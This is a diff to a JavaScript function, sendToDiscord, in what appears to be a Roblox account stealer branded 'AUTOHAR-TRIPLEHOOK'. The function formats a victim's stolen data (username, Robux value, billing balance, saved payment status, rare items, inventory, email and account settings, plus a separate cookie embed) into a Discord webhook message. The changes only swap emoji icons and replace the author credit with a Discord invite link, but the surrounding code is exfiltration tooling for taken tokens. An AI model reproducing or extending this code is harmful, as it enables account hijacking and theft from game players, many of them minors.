@@ -1844,11 +1844,11 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
     if (userData) {
       // First embed: User data only (without cookie)
       const userDataEmbed = {
-        title: customTitle || "<:hacker:1404745235711655987> AUTOHAR-TRIPLEHOOK",
+        title: customTitle || "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
         color: 0x8B5CF6,
         fields: [
           {
-            name: "<:member_IDS:1393888535412740096> Username",
+            name: "<:emoji_37:1410520517349212200> Username",
             value: userData.username || "Unknown",
             inline: false
           },
@@ -1863,17 +1863,17 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<:emoji_32:1410233641371697313> RAP",
+            name: "<:emoji_36:1410512337839849543> RAP",
             value: userData.rap?.toString() || "0",
             inline: true
           },
           {
-            name: "<a:emoji_34:1410247101971173477> Summary",
+            name: "<:emoji_40:1410521889121501214> Summary",
             value: userData.summary?.toString() || "0",
             inline: true
           },
           {
-            name: "<a:emoji_33:1410233678226788443> Billing",
+            name: "<a:emoji_42:1410523396995022890> Billing",
             value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
             inline: false
           
@@ -1885,35 +1885,35 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<:emoji_26:1409704610469253153> Collectibles",
+            name: "<:emoji_39:1410521396420939787> Collectibles",
             value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
             inline: true
           },
                     
           {
-            name: " Groups Owned",
+            name: "<:emoji_38:1410520554842361857> Groups Owned",
             value: userData.groupsOwned?.toString() || "0",
             inline: true
           },
           {
-            name: " Place Visits",
+            name: "<:emoji_41:1410522675821940820> Place Visits",
             value: userData.placeVisits?.toString() || "0",
             inline: true
           },
           {
-            name: " Inventory",
+            name: "<:emoji_37:1410517247751094363> Inventory",
             value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
             inline: false
           },
           {
-            name: " Settings",
+            name: "<:emoji_38:1410517275328647218> Settings",
             value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
             inline: false                  
           },
           
         ],
         footer: {
-          text: "Made By Lunix"
+          text: "Made By .gg/sZbFX2wPVz"
         }
       };
 
